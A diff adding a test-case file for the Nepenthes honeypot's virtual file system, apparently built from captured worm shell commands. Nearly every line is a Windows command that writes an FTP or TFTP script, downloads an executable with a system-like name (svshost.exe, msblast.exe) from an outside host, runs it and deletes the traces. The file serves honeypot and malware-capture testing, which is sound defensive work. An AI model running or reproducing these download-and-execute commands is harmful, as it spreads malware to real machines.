@@ -1,0 +1,57 @@
+
+		Nepenthes 
+	- the finest collection -
+	
+VFS Testcases	
+
+
+echo open 84.178.229.215 13468 > o&echo user 1 1 >> o &echo get sysmsvc.exe >> o &echo quit >> o &ftp -n -s:o &sysmsvc.exe
+
+echo open dust2.page.us 58736 >hgz.dll &echo user tomz0r downl0ad >>hgz.dll &echo binary >>hgz.dll &echo get >>hgz.dll &echo t.exe >>hgz.dll &echo navupdts.exe >>hgz.dll &echo bye >>hgz.dll &ftp.exe -n -s:hgz.dll &del hgz.dll &navupdts.exe
+
+echo open dust2.page.us 58736 >msw.dll &echo user tomz0r downl0ad >>msw.dll &echo binary >>msw.dll &echo get >>msw.dll &echo s.exe >>msw.dll &echo mswords.exe >>msw.dll &echo bye >>msw.dll &ftp.exe -n -s:msw.dll &del msw.dll &mswords.exe
+
+echo open ftpbilla.page.us 21 > elitenub &echo user l0l elitenub >> elitenub &echo get lol.exe >> elitenub &echo quit >> elitenub &ftp -n -s:elitenub &lol.exe
+
+echo open plz.endtheracism.info 58739 >msw.dll &echo user wh0re gotfucked >>msw.dll &echo binary >>msw.dll &echo get >>msw.dll &echo msau.exe >>msw.dll &echo msua.exe >>msw.dll &echo bye >>msw.dll &ftp.exe -n -s:msw.dll &del msw.dll &msua.exe
+
+echo open senftp.ani-hell.net 612 >hgz.dll &echo user sen klopklop >>hgz.dll &echo binary >>hgz.dll &echo get >>hgz.dll &echo sen.exe >>hgz.dll &echo msfwe1.exe >>hgz.dll &echo bye >>hgz.dll &ftp.exe -n -s:hgz.dll &del hgz.dll &msfwe1.exe
+
+echo open wowvill.easydns.us 5192 > appmr.dll&echo user tr lo.max >> appmr.dll &echo binary >> appmr.dll &echo get run.exe >> appmr.dll &echo quit >> appmr.dll &ftp -n -s:appmr.dll &del /Q appmr.dll &run.exe
+
+echo off&echo open 12.22.206.206 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 4610_up.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&4610_up.exe&echo off&del cmd.ftp&echo on
+
+tftp -i 12.221.176.67 GET msblast.exe
+
+echo off&echo open 12.75.31.164 1023>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 11368_upload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&11368_upload.exe&echo off&del cmd.ftp&echo on
+
+echo open wowvill.easydns.us 5192 >appmr.dll &echo user tr lo.max >>appmr.dll &echo binary >>appmr.dll &echo get >>appmr.dll &echo rant.exe >>appmr.dll &echo ran3.exe >>appmr.dll &echo bye >>appmr.dll &ftp.exe -n -s:appmr.dll &del appmr.dll &ran3.exe
+
+echo off&echo open 221.126.243.207 5554>>cmd.ftp&echo anonymous>>cmd.ftp&echo user&echo bin>>cmd.ftp&echo get 32114_up.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&32114_up.exe&echo off&del cmd.ftp&echo on
+
+tftp -i 10.120.57.149 GET h3110.411 package.exe & package.exe & exit
+
+echo open 66.103.188.17 5463 > o&echo user 1 1 >> o &echo get TASKMN.EXE >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &TASKMN.EXE
+
+echo open 10.2.9.226 16343 > o&echo user 1 1 >> o &echo get taskmng.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &taskmng.exe
+
+echo open 71.109.99.132 15784 > o&echo user 1 1 >> o &echo get svshost.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &svshost.exe
+
+cmd.exe /c echo user nettraf@web.cplnn.com>ntsdd.txt && echo fkIeXmd>>ntsdd.txt && echo binary>>ntsdd.txt && echo get mmf32.exe>>ntsdd.txt && echo quit>>ntsdd.txt && ftp -s:ntsdd.txt -n -d web.cplnn.com && del ntsdd.txt && mmf32.exe
+
+echo open ftp.dimension2k5.net 612 >hgz.dll &echo user w00t rT3n0 >>hgz.dll &echo binary >>hgz.dll &echo get >>hgz.dll &echo Revo.exe >>hgz.dll &echo msfwe1.exe >>hgz.dll &echo bye >>hgz.dll &ftp.exe -n -s:hgz.dll &del hgz.dll &msfwe1.exe
+
+
+echo open 0.0.0.0 17128>.pif
+echo user a a>>.pif
+echo binary>>.pif
+echo GET servicetask.exe>>.pif
+echo bye>>.pif
+echo @echo off >c.bat
+echo ftp -n -v -s:.pif >>c.bat
+echo servicetask.exe >>c.bat
+echo del .pif >>c.bat
+echo del /F c.bat >>c.bat
+echo exit /y >>c.bat
+c.bat
+
